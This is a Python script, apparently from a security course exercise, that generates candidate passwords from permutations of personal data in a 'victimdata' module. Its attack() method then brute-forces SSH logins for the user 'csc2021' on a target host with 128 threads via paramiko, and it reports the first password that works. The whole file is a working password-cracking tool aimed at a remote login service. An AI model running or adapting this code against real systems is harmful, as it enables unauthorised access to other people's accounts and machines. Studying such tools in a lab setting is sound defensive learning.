from victimdata import *
import itertools
import paramiko
import sys
import time
import threading

victim_passwd = ""
index = 0
thread_idx_list = []
lock = threading.Lock()
THREAD_NUMBER = 128

def init_thread_idx(MAX_NUM):
    global thread_idx_list
    for i in range(THREAD_NUMBER):
        thread_idx_list.append(i*int(MAX_NUM/THREAD_NUMBER))

def job(passwd_list, maxlength, thread_idx):
    global victim_passwd
    global index
    global thread_idx_list
    while(True):
        if(victim_passwd != ""):
            break
        idx = 0
        lock.acquire()
        idx = thread_idx_list[thread_idx]
        thread_idx_list[thread_idx] += 1
        lock.release()
        if(idx >= maxlength):
            break

        trans = paramiko.Transport((sys.argv[1],  22))
        trans.banner_timeout = 30
        try:
            trans.connect(username="csc2021",  password=passwd_list[idx])
        except paramiko.SSHException:
            trans.close()
            print("password: %-40s is UNsuccessful, index: %d" % (passwd_list[idx], idx))
        except paramiko.AuthenticationException:
            trans.close()
            print("password: %-40s is UNsuccessful, index: %d" % (passwd_list[idx], idx))
        else:
            print("Successful 🤖️🤖️🤖️ ! password is : %s" %
                  passwd_list[idx])
            victim_passwd = passwd_list[idx]
        time.sleep(0.5)

class dictionary():
    
    passwd = []
    data   = victim_data

    def __init__(self):
        for i in range(1,len(victim_data)):
            for j in itertools.permutations(self.data, i):
                str = ""
                for k in j:
                    str += k
                self.passwd.append(str)

    def print_passwd(self):
        for i in self.passwd:
            print(i)
        
    def attack(self):
        threads = []
        init_thread_idx(len(self.passwd))
        for i in range(THREAD_NUMBER):
            threads.append(threading.Thread(target=job,args=(self.passwd, len(self.passwd), i)))
            threads[i].start()
        
        while(True):
            if(victim_passwd!=""):break
        
        print("NICE! Cracking Successfully")
        for i in range(THREAD_NUMBER):
            threads[i].join()
        return victim_passwd

    

if __name__ == "__main__":
    dict = dictionary()
    dict.print_passwd()
